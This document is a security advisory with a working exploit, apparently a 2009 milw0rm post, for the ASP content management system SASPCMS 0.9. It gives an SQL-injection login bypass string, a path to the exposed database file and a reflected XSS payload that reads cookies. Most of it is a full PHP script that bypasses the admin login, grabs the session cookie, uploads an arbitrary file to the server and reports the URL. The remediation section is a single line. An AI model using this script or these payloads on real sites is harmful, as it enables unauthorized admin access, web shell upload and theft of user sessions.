<html><head><title>SASPCMS 0.9 Multiple Remote Vulnerabilities</title></head><pre>##########################www.BugReport.ir########################################
#
#        AmnPardaz Security Research Team
#
# Title:        SASPCMS Multiple Vulnerabilities
# Vendor:        http://www.lgasoft.com
# Vulnerable Version:    0.9 (prior versions also may be affected)
# Exploitation:        Remote with browser
# Fix:            N/A
###################################################################################

####################
- Description:
####################

SASPCMS is an ASP Content Management System . SASPCMS witch uses MSSQL &amp; Microsoft Access as backend database.

####################
- Vulnerability:
####################

+--&gt;Authentication Bypass

POC: ' or ''='
http://[URL]/saspcms/admin/default.asp


+--&gt;Database Information Disclosure

POC: http://[URL]/saspcms/db/menu.mdb


+--&gt;Cross Site Scripting (XSS). Reflected XSS attack in &quot;default.asp&quot; in &quot;q&quot; parameter.

POC: http://[URL]/saspcms/default.asp?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;



####################
- PoC:
####################

It's possible for remote attackers to upload arbitrary files by using FCKEditor after login to admin area.

&lt;?php
########################## WwW.BugReport.ir ######################################
#
#      AmnPardaz Security Research &amp; Penetration Testing Group
#
# Title: SASPCMS Remote File Upload
# Original Advisory: http://www.bugreport.ir/index_64.htm
##################################################################################

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;, 5);
ob_implicit_flush (1);

echo'&lt;html&gt;
&lt;head&gt;
&lt;title&gt;SASPCMS Remote File Upload&lt;/title&gt;
&lt;/head&gt;

&lt;body bgcolor=&quot;#00000&quot;&gt;

&lt;p align=&quot;center&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;white&quot;&gt;SASPCMS Remote File Upload&lt;/font&gt;&lt;/p&gt;
&lt;/font&gt;
&lt;table width=&quot;90%&quot;&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td width=&quot;43%&quot; align=&quot;left&quot;&gt;
        &lt;form name=&quot;form1&quot; action=&quot;'.$SERVER[PHP_SELF].'&quot; enctype=&quot;multipart/form-data&quot;  method=&quot;post&quot;&gt;
          &lt;p&gt;&lt;/font&gt;&lt;font color=&quot;white&quot; &gt; hostname (ex:www.sitename.com):&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp&lt;/font&gt;&lt;input name=&quot;host&quot; size=&quot;20&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;*&lt;/span&gt;&lt;/p&gt;
          &lt;p&gt;&lt;/font&gt;&lt;font color=&quot;white&quot; &gt; path (ex: /saspcms/ or just / ):&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp&lt;/font&gt;&lt;input name=&quot;path&quot; size=&quot;20&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;*&lt;/span&gt;&lt;/p&gt;
          &lt;p&gt;&lt;/font&gt;&lt;font color=&quot;white&quot; &gt;Please specify a file to upload: &amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&lt;/font&gt;&lt;input type=&quot;file&quot; name=&quot;datafile&quot; size=&quot;40&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt; * &lt;/font&gt;
          &lt;p&gt;&lt;font color=&quot;white&quot; &gt;  specify a port&amp;nbsp;(default is 80):&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp &lt;/font&gt;&lt;input name=&quot;port&quot; size=&quot;20&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
          &lt;p&gt;&lt;font color=&quot;white&quot; &gt;  Proxy (ip:port):&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp&lt;/font&gt;&lt;input name=&quot;proxy&quot; size=&quot;20&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
          &lt;p align=&quot;center&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;* &lt;/font&gt;&lt;font color=&quot;white&quot; &gt;fields are required&lt;/font&gt;&lt;/font&gt;&lt;/span&gt;&lt;/p&gt;
          &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;Start&quot; name=&quot;Submit&quot;&gt;&lt;/p&gt;
        &lt;/form&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/body&gt;&lt;/html&gt;';

function sendpacket($packet,$response = 0,$output = 0)
{
    $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
    global $proxy, $host, $port, $html;
    if ($proxy == '')
    {
        $ock = fsockopen($host,$port);
        if (!$ock)
        {
            $off = 1;
            echo '&lt;font color=white&gt; No response from '.htmlentities($host).' ...&lt;br&gt;&lt;/font&gt;';
            die;
        }
    } else
    {
        $parts = explode(':',$proxy);
        echo '&lt;font color=white&gt;Connecting to '.$parts[0].':'.$parts[1].' proxy...&lt;br&gt;&lt;/font&gt;';
        $ock   = fsockopen($parts[0],$parts[1]);
        if (!$ock)
        {
            echo '&lt;font color=white&gt;No response from proxy...&lt;br&gt;&lt;/font&gt;';
            die;
        }
    }
    if($off == 1)
    {}else
    {
        fputs($ock,$packet);
        if ($response == 1)
        {
            if ($proxy == '')
            {
                $html = '';
                while (!feof($ock))
                {
                    $html .= fgets($ock);
                }
            } else
            {
                $html = '';
                while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
                {
                    $html .= fread($ock,1);
                }
            }
        } else $html = '';
        fclose($ock);
        if ($response == 1 &amp;&amp; $output == 1) echo nl2br(htmlentities($html));
    }
}

  $host   = $_POST['host'];
  $path   = $_POST['path'];
  $port   = $_POST['port'];

if (isset($_POST['Submit']) &amp;&amp; $host != '' &amp;&amp; $path != '')
{

  $port=intval(trim($port));
  if ($port=='') {$port=80;}
  if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {die('&lt;font color=white&gt;Error... check the path!&lt;/font&gt;');}
  if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
  $host=str_replace(&quot;\r\n&quot;,&quot;&quot;,$host);
  $path=str_replace(&quot;\r\n&quot;,&quot;&quot;,$path);

  // login to the admin area
  $query   = &quot;SAspCms=%27+or+%27%27%3D%27&quot;;
  $packet  = &quot;POST &quot;.$p.&quot;admin/admin.asp HTTP/1.1\r\n&quot;;
  $packet .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;
  $packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
  $packet .= &quot;Cache-Control: no-cache\r\n&quot;;
  $packet .= &quot;Content-Length: &quot;.strlen($query).&quot;\r\n&quot;;
  $packet .= &quot;Connection: Close\r\n\r\n&quot;;
  $packet .= $query;

  sendpacket($packet,1,0);
  if(stristr($html , 'Set-Cookie: ASPSESSIONID') == true)
  {
      $pattern      = &quot;(ASPSESSIONID[A-Z]{8}=[A-Z]{24})&quot;;
      $cookie_name  = (preg_match($pattern, $html, $matches)) ? $matches[0] : '';
  }

  // Upload File
  $content = file_get_contents($_FILES['datafile']['tmp_name']);
  $name    = rand().$_FILES['datafile']['name'];
  $type    = $_FILES['datafile']['type'];
  $data    = &quot;-----------------------------7d51143b10418\r\n&quot;;
  $data   .= &quot;Content-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;$name\&quot;\r\n&quot;;
  $data   .= &quot;Content-Type: &quot;.$type.&quot;\r\n\r\n&quot;;
  $data   .= &quot;$content\r\n&quot;;
  $data   .= &quot;-----------------------------7d51143b10418--&quot;;
  $packet  = &quot;POST &quot;.$p.&quot;wexlite/default.asp?precommand=ProcessUpload&amp;folder=userfiles%5C&amp;popup=true HTTP/1.1\r\n&quot;;
  $packet .= &quot;Content-Type: multipart/form-data; boundary=---------------------------7d51143b10418\r\n&quot;;
  $packet .= &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\r\n&quot;;
  $packet .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;
  $packet .= &quot;Cookie: $cookie_name\r\n&quot;;
  $packet .= &quot;Cache-Control: no-cache\r\n&quot;;
  $packet .= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
  $packet .= &quot;Connection: Close\r\n\r\n&quot;;
  $packet .= $data;
  sendpacket($packet,1,0);

  $packet  = &quot;GET &quot;.$p.&quot;userfiles/$name HTTP/1.1\r\n&quot;;
  $packet .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;
  $packet .= &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\r\n&quot;;
  $packet .= &quot;Cache-Control: no-cache\r\n&quot;;
  $packet .= &quot;Connection: Close\r\n\r\n&quot;;
  sendpacket($packet,1,0);

  if(stristr($html , '200 OK') != true)
  {echo &quot;&lt;font color=white&gt;Exploit Faild...&lt;/font&gt;&quot;;} else echo &quot;&lt;font color=white&gt;Exploit Succeeded...&lt;br&gt;http://$host:$port$path&quot;.&quot;userfiles/$name&lt;/font&gt;&quot;;
}
?&gt;


####################
- Solution:
####################

Edit the source code to ensure that inputs are properly sanitized.


####################
- Credit:
####################
AmnPardaz Security Research &amp; Penetration Testing Group
Contact: admin[4t}bugreport{d0t]ir
www.BugReport.ir
www.AmnPardaz.com 

# milw0rm.com [2009-04-08]</pre></html>